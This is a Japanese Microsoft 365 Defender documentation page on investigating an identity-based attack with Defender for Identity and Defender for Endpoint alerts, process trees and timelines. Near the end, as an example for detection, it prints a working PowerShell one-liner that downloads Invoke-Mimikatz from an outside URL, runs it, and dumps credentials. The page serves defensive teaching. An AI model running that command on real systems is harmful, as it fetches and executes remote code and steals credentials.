---
title: ID ベースの攻撃の例
description: ID ベースの攻撃の分析の例を示します。
keywords: インシデント, アラート, 調査, 相関関係, 攻撃, マシン, デバイス, ユーザー, ID, ID, メールボックス, 電子メール, 365, microsoft, m365, インシデント対応, サイバー攻撃
search.product: eADQiWindows 10XVcnh
ms.prod: m365-security
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
f1.keywords:
- NOCSH
ms.author: dansimp
author: dansimp
ms.localizationpriority: medium
manager: dansimp
audience: ITPro
ms.collection:
- M365-security-compliance
- m365solution-firstincident
ms.topic: conceptual
search.appverid:
- MOE150
- MET150
ms.technology: m365d
ms.openlocfilehash: 2e0b237ad045b98b2bb013399f344db3f20f1919
ms.sourcegitcommit: c1eaea74c8ffce2f9f477c9469342e88e4a70c14
ms.translationtype: MT
ms.contentlocale: ja-JP
ms.lasthandoff: 07/20/2022
ms.locfileid: "66893619"
---
# <a name="example-of-an-identity-based-attack"></a>ID ベースの攻撃の例

[!INCLUDE [Microsoft 365 Defender rebranding](../includes/microsoft-defender.md)]

**適用対象:**
- Microsoft 365 Defender

Microsoft Defender for Identityは、組織内の ID を侵害する悪意のある試みを検出するのに役立ちます。 Defender for Identity はMicrosoft 365 Defenderと統合されるため、セキュリティ アナリストは、Netlogon 特権昇格の試行の疑いなど、Defender for Identity からの脅威を可視化できます。

## <a name="analyzing-the-attack-in-microsoft-defender-for-identity"></a>Microsoft Defender for Identityでの攻撃の分析

Microsoft 365 Defenderを使用すると、アナリストはインシデント ページの [アラート] タブで検出ソースによって **アラート** をフィルター処理できます。 次の例では、検出ソースが **Defender for Identity** にフィルター処理されます。 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mdi-filter.png" alt-text="Microsoft Defender for Identityで検出ソースをフィルター処理する" lightbox="../../media/first-incident-path-identity/first-incident-identity-mdi-filter.png":::

**ハッシュ攻撃の疑いのあるアラートを** 選択すると、Microsoft Defender for Cloud Appsのページに移動し、より詳細な情報が表示されます。 アラートまたは攻撃の詳細については、 **このアラートの種類の詳細** を選択して、攻撃と修復 [の提案の説明を](/defender-for-identity/lateral-movement-alerts#suspected-overpass-the-hash-attack-kerberos-external-id-2002) 読むことができます。
 
:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-alert-example.png" alt-text="疑わしい超過ハッシュ攻撃アラート" lightbox="../../media/first-incident-path-identity/first-incident-identity-alert-example.png"::: 

## <a name="investigating-the-same-attack-in-microsoft-defender-for-endpoint"></a>Microsoft Defender for Endpointで同じ攻撃を調査する

または、アナリストは Defender for Endpoint を使用して、エンドポイント上のアクティビティの詳細を確認することもできます。 インシデント キューからインシデントを選択し、[ **アラート** ] タブを選択します。ここから、検出ソースも識別できます。 EDR としてラベル付けされた検出ソースは、エンドポイントの検出と応答を表します。これは Defender for Endpoint です。 ここから、アナリストは EDR によって検出されたアラートを選択します。

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mde-edr.png" alt-text="Microsoft Defender for Endpoint ポータルでのエンドポイントの検出と応答" lightbox="../../media/first-incident-path-identity/first-incident-identity-mde-edr.png":::

アラート ページには、影響を受けるデバイス名、ユーザー名、自動調査の状態、アラートの詳細など、さまざまな関連情報が表示されます。 アラート ストーリーは、プロセス ツリーの視覚的な表現を示しています。 プロセス ツリーは、アラートに関連する親プロセスと子プロセスを階層的に表したものです。

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mde-tree.png" alt-text="Microsoft Defender for Endpointのアラート プロセス ツリー" lightbox="../../media/first-incident-path-identity/first-incident-identity-mde-tree.png"::: 

各プロセスを展開して詳細を表示できます。 アナリストが確認できる詳細は、悪意のあるスクリプト、送信接続 IP アドレス、およびその他の有用な情報の一部として入力された実際のコマンドです。

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-process-details.png" alt-text="Microsoft Defender for Endpoint ポータルのプロセスの詳細" lightbox="../../media/first-incident-path-identity/first-incident-identity-process-details.png":::
 
**[タイムラインで表示]** を選択すると、アナリストはさらにドリルダウンして、侵害の正確な時刻を判断できます。 

Microsoft Defender for Endpointは、多くの悪意のあるファイルとスクリプトを検出できます。 ただし、送信接続、PowerShell、およびコマンド ライン アクティビティの正当な用途が多いため、悪意のあるファイルまたはアクティビティが作成されるまで、一部のアクティビティは無害と見なされます。 そのため、タイムラインを使用すると、アナリストは周囲のアクティビティと共にコンテキストにアラートを配置し、他の場合は共通のファイル システムとユーザー アクティビティによって隠されている攻撃の元のソースまたは時刻を判断できます。 

タイムラインを使用するために、アナリストはアラート検出の時点 (赤) から開始し、時間をさかのぼって下にスクロールして、悪意のあるアクティビティにつながった元のアクティビティが実際に開始されたタイミングを判断します。 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-start-time.png" alt-text="アナリストのアラート検出の開始時刻" lightbox="../../media/first-incident-path-identity/first-incident-identity-start-time.png"::: 

Windows Update接続、Windows Trusted Software アクティブ化トラフィック、Microsoft サイトへのその他の一般的な接続、サード パーティのインターネット アクティビティ、Microsoft Endpoint Configuration Manager アクティビティなどの一般的なアクティビティを、疑わしいアクティビティから理解して区別することが重要です。 区別する方法の 1 つは、タイムライン フィルターを使用する方法です。 アナリストが表示したくないものを除外しながら、特定のアクティビティを強調表示できるフィルターは多数あります。 

次の図では、アナリストがフィルター処理して、ネットワーク イベントとプロセス イベントのみを表示しています。 このフィルター条件を使用すると、アナリストは、メモ帳が IP アドレスとの接続を確立したイベントを取り巻くネットワーク接続とプロセスを確認できます。プロセス ツリーでも確認できます。 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-notepad.png" alt-text="メモ帳を使用して悪意のある送信接続を行った方法" lightbox="../../media/first-incident-path-identity/first-incident-identity-notepad.png"::: 

この特定のイベントでは、メモ帳を使用して悪意のある送信接続を行いました。 ただし、通常、iexplorer.exe プロセスは通常の Web ブラウザー アクティビティと見なされるため、攻撃者はiexplorer.exeを使用して悪意のあるペイロードをダウンロードするための接続を確立します。

タイムラインで探すもう 1 つの項目は、PowerShell が送信接続に使用することです。 アナリストは、悪意のあるファイルをホストしている Web サイトへの送信接続に `IEX (New-Object Net.Webclient)` 続いて、コマンドを使用して PowerShell 接続が正常に行われるかどうかを探します。 

次の例では、PowerShell を使用して、Web サイトから Mimikatz をダウンロードして実行しました。

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds
```
アナリストは、検索バーにキーワードを入力してキーワードをすばやく検索し、PowerShell で作成されたイベントのみを表示できます。 

## <a name="next-step"></a>次の手順

フィッシング調査パス [を](first-incident-path-phishing.md) 参照してください。

## <a name="see-also"></a>関連項目

- [インシデントの概要](incidents-overview.md)
- [インシデントの管理](manage-incidents.md)
- [インシデントの調査](investigate-incidents.md)
